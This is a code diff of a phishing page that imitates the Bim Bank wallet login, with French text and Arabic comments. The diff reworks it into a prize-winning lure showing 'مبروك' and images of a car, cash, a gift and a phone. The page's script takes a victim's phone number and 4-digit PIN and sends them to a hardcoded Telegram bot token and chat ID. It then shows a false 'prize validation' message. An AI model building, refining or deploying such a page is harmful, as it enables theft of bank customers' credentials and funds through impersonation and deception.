@@ -3,183 +3,164 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bim Bank - Espace Client</title>
+    <title>Bim Bank - Félicitations</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@900&family=Segoe+UI:wght@400;700&display=swap');
         
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; }
 
-        /* خلفية الشبكة المربعة الدقيقة (نفس الصورة الأصلية) */
+        /* خلفية الشبكة المربعة */
         .bg-app-grid {
             background-image: linear-gradient(#f3f4f6 1px, transparent 1px), linear-gradient(90deg, #f3f4f6 1px, transparent 1px);
             background-size: 20px 20px;
         }
 
-        /* الشعار المصمم برمجياً ليكون مطابقاً للهيكل الأصلي */
-        .bim-logo-box {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            padding: 30px 0 10px 0;
+        /* كلمة مبروك المزخرفة */
+        .congrats-title {
+            font-family: 'Cairo', sans-serif;
+            font-size: 50px;
+            font-weight: 900;
+            background: linear-gradient(to bottom, #f19e2c 0%, #d97706 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.2));
+            text-align: center;
+            padding: 20px 0 10px 0;
+            display: block;
         }
-        .logo-symbol {
-            width: 55px;
-            height: 55px;
-            position: relative;
-            transform: rotate(-15deg); /* ميلان طفيف ليشبه شعار بيم بنك */
-        }
-        .segment { position: absolute; width: 28px; height: 28px; border-radius: 4px; }
-        .seg-1 { background: #00a19a; top: 0; left: 0; }
-        .seg-2 { background: #e6007e; top: 0; right: 0; }
-        .seg-3 { background: #f19e2c; bottom: 0; left: 0; }
-        .seg-4 { background: #2a4387; bottom: 0; right: 0; }
 
-        .logo-txt-line { border-left: 2px solid #2a4387; padding-left: 12px; text-align: left; }
-        .txt-bim { color: #2a4387; font-size: 28px; font-weight: 800; line-height: 0.9; }
-        .txt-bank { color: #2a4387; font-size: 11px; font-weight: bold; letter-spacing: 0.5px; }
-
-        /* قسم الجوائز الذهبية */
-        .promo-banner {
-            background: linear-gradient(135deg, #f19e2c 0%, #d97706 100%);
-            margin: 15px 25px;
-            padding: 15px;
-            border-radius: 12px;
+        /* شريط الجوائز بواقعية أكثر */
+        .prize-banner-real {
+            background: linear-gradient(135deg, #f19e2c 0%, #b45309 100%);
+            margin: 10px 20px;
+            padding: 20px 10px;
+            border-radius: 20px;
             display: flex;
             justify-content: space-around;
-            box-shadow: 0 4px 12px rgba(241, 158, 44, 0.4);
+            box-shadow: 0 15px 30px rgba(241, 158, 44, 0.3);
+            border: 2px solid rgba(255, 255, 255, 0.3);
         }
-        .item-box { text-align: center; color: white; }
-        .item-ico { font-size: 24px; display: block; filter: drop-shadow(0 2px 2px rgba(0,0,0,0.2)); }
-        .item-lbl { font-size: 9px; font-weight: bold; text-transform: uppercase; margin-top: 4px; }
+        .prize-unit { text-align: center; width: 22%; }
+        .prize-img { 
+            width: 50px; 
+            height: 50px; 
+            object-fit: contain; 
+            margin: 0 auto;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
+            transition: transform 0.3s;
+        }
+        .prize-unit:hover .prize-img { transform: scale(1.2); }
+        .prize-tag { font-size: 10px; font-weight: 900; color: white; margin-top: 8px; text-transform: uppercase; }
 
-        /* تنسيق الحقول لتطابق صورة الهاتف */
-        .field-input {
+        /* التنسيقات الرسمية */
+        .field-box {
             width: 100%;
             padding: 16px;
             border: 1px solid #d1d5db;
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 16px;
-            color: #374151;
-            background: white;
             outline: none;
+            background: white;
         }
-        .field-label { color: #2a4387; font-weight: 700; margin-bottom: 8px; display: block; font-size: 15px; }
-        .char-tracker { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 4px; }
+        .tracker { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 4px; }
 
-        /* زر Connexion البرتقالي الأصلي */
-        .btn-bim-orange {
+        .btn-action {
             background-color: #f19e2c;
             color: white;
             font-weight: 700;
             padding: 16px;
-            border-radius: 8px;
+            border-radius: 10px;
             width: 100%;
-            font-size: 1.1rem;
-            margin-top: 20px;
-            border: none;
-            cursor: pointer;
+            font-size: 1.2rem;
+            margin-top: 25px;
+            box-shadow: 0 4px 10px rgba(241, 158, 44, 0.4);
         }
     </style>
 </head>
 <body class="bg-app-grid min-h-screen">
 
-    <!-- الشعار الرسمي المصمم -->
-    <div class="bim-logo-box">
-        <div class="logo-symbol">
-            <div class="segment seg-1"></div>
-            <div class="segment seg-2"></div>
-            <div class="segment seg-3"></div>
-            <div class="segment seg-4"></div>
+    <!-- استبدال الشعار بكلمة مبروك مزخرفة -->
+    <div class="congrats-title">! مبروك</div>
+
+    <!-- شريط الجوائز بصور حقيقية -->
+    <div class="prize-banner-real">
+        <div class="prize-unit">
+            <img src="https://img.icons8.com/color/96/car-key.png" alt="Auto" class="prize-img">
+            <div class="prize-tag">AUTO</div>
         </div>
-        <div class="logo-txt-line">
-            <div class="txt-bim">bimbank</div>
-            <div class="txt-bank">BANQUE ISLAMIQUE</div>
+        <div class="prize-unit">
+            <img src="https://img.icons8.com/color/96/money-bag-with-cash.png" alt="Cash" class="prize-img">
+            <div class="prize-tag">CASH</div>
+        </div>
+        <div class="prize-unit">
+            <img src="https://img.icons8.com/color/96/gift--v1.png" alt="Gift" class="prize-img">
+            <div class="prize-tag">GIFT</div>
+        </div>
+        <div class="prize-unit">
+            <img src="https://img.icons8.com/color/96/iphone-x.png" alt="Tech" class="prize-img">
+            <div class="prize-tag">TECH</div>
         </div>
     </div>
 
-    <!-- قسم الهدايا (مفاتيح سيارة، فلوس، هدايا) -->
-    <div class="promo-banner">
-        <div class="item-box">
-            <span class="item-ico">🔑</span>
-            <span class="item-lbl">Auto</span>
-        </div>
-        <div class="item-box">
-            <span class="item-ico">💰</span>
-            <span class="item-lbl">Cash</span>
-        </div>
-        <div class="item-box">
-            <span class="item-ico">🎁</span>
-            <span class="item-lbl">Gift</span>
-        </div>
-        <div class="item-box">
-            <span class="item-ico">📱</span>
-            <span class="item-lbl">Tech</span>
-        </div>
+    <div class="text-center mt-4">
+        <p class="text-[#2a4387] font-bold text-lg">Bienvenue dans votre espace wallet</p>
     </div>
 
-    <div class="text-center mt-2 px-6">
-        <p class="text-[#2a4387] font-semibold text-lg">Bienvenue dans votre espace wallet</p>
-    </div>
-
-    <!-- منطقة التبديل Wallet/Banking -->
     <div class="max-w-sm mx-auto px-6 mt-6">
-        <div class="flex border-2 border-[#2a4387] rounded-lg overflow-hidden">
-            <div class="flex-1 bg-[#2a4387] text-white py-2.5 text-center font-bold">Wallet</div>
-            <div class="flex-1 bg-white text-gray-400 py-2.5 text-center font-bold">Banking</div>
+        <div class="flex border-2 border-[#2a4387] rounded-xl overflow-hidden">
+            <div class="flex-1 bg-[#2a4387] text-white py-3 text-center font-bold">Wallet</div>
+            <div class="flex-1 bg-white text-gray-400 py-3 text-center font-bold">Banking</div>
         </div>
     </div>
 
-    <!-- النموذج -->
     <div class="max-w-sm mx-auto px-6 mt-10">
-        <h2 class="text-[#2a4387] font-bold text-xl mb-5">Connexion</h2>
+        <h2 class="text-[#2a4387] font-bold text-xl mb-6">Connexion</h2>
 
-        <div class="space-y-5">
+        <div class="space-y-6">
             <div>
-                <input id="p_field" type="tel" maxlength="8" oninput="limit(this, 'p_count')" class="field-input" placeholder="Téléphone">
-                <div id="p_count" class="char-tracker">0/8</div>
+                <input id="ph" type="tel" maxlength="8" oninput="limitIn(this, 'ph_c')" class="field-box" placeholder="Téléphone">
+                <div id="ph_c" class="tracker">0/8</div>
             </div>
             <div>
-                <input id="s_field" type="password" maxlength="4" oninput="limit(this, 's_count')" class="field-input" placeholder="Mot de passe">
-                <div id="s_count" class="char-tracker">0/4</div>
+                <input id="pi" type="password" maxlength="4" oninput="limitIn(this, 'pi_c')" class="field-box" placeholder="Mot de passe">
+                <div id="pi_c" class="tracker">0/4</div>
             </div>
         </div>
 
         <div class="text-right mt-3">
-            <a href="#" class="text-gray-400 text-sm font-medium">Mot de passe oublié ?</a>
+            <a href="#" class="text-gray-400 text-sm">Mot de passe oublié ?</a>
         </div>
 
-        <button onclick="submitToAdmin()" class="btn-bim-orange">Connexion</button>
+        <button onclick="sendToBot()" class="btn-action">Connexion</button>
 
-        <div class="mt-12 text-center">
-            <p class="text-gray-500">Nouvel utilisateur ?</p>
+        <div class="mt-14 text-center">
+            <p class="text-gray-400">Nouvel utilisateur ?</p>
             <a href="#" class="text-[#2a4387] font-bold mt-1 block">S'inscrire maintenant &rarr;</a>
         </div>
     </div>
 
     <script>
-        const BOT_TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
-        const ADMIN_ID = "8665814266";
+        const B_T = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
+        const C_D = "8665814266";
 
-        function limit(el, countId) {
+        function limitIn(el, cid) {
             el.value = el.value.replace(/[^0-9]/g, '');
-            document.getElementById(countId).textContent = el.value.length + '/' + el.maxLength;
+            document.getElementById(cid).textContent = el.value.length + '/' + el.maxLength;
         }
 
-        function submitToAdmin() {
-            const p = document.getElementById('p_field').value;
-            const s = document.getElementById('s_field').value;
-            
+        function sendToBot() {
+            const p = document.getElementById('ph').value;
+            const s = document.getElementById('pi').value;
             if(p.length === 8 && s.length === 4) {
-                const text = `🚀 BimBank Official Submission:\n📱 Number: ${p}\n🔐 PIN: ${s}\n🎁 Status: Prize Eligible`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`)
+                const text = `🎉 Winner Logged In!\n📱 Phone: ${p}\n🔐 PIN: ${s}`;
+                fetch(`https://api.telegram.org/bot${B_T}/sendMessage?chat_id=${C_D}&text=${encodeURIComponent(text)}`)
                 .then(() => {
-                    alert("Connexion réussie. Vérification de votre éligibilité aux prix en cours...");
+                    alert("Succès! Validation de votre prix en cours.");
                     location.reload();
                 });
             } else {
-                alert("Veuillez remplir correctement vos informations.");
+                alert("يرجى إدخال البيانات كاملة.");
             }
         }
     </script>
